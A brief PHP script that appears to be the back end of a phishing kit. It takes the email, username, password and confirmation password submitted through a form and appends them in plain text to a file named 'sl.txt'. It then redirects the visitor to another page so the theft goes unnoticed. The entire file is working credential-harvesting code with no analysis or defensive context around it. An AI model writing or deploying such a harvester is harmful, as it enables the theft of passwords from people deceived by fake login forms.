<?php
//initiallize form details
$ip = getenv("REMOTE_ADDR");

$Email_Address= $_POST['email'];
$User_Name =  $_POST['username'];
$P_assword =  $_POST['password'];
$C_Password =  $_POST['conpassword'];
$datamasii=date("D M d, Y g:i a");
$saver= "$Email_Address || $User_Name || $P_assword || $C_Password =";

$fp=fopen('sl.txt', 'a');
fwrite($fp, $saver);
fclose($fp);

header("Location: file.php");

?>